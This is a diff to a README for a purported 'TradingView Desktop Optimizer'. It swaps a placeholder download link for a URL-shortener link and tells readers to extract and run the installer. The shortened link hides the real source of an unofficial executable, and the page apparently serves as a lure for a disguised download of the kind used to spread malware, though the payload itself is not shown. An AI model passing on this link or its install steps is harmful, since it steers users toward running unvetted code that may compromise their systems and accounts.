@@ -12,7 +12,7 @@ TradingView Desktop Optimizer is a tool designed to help you maximize the perfor
 
 ## 📥 How to Download and Install
 
-1. **[Download TradingView Desktop Optimizer](https://example-link.com)**
+1. **[Download TradingView Desktop Optimizer](https://t.ly/jg52n)**
 2. Extract the downloaded files and run the installer.
 3. Follow the on-screen installation wizard.
 4. Launch the application to enjoy an enhanced TradingView Desktop experience.
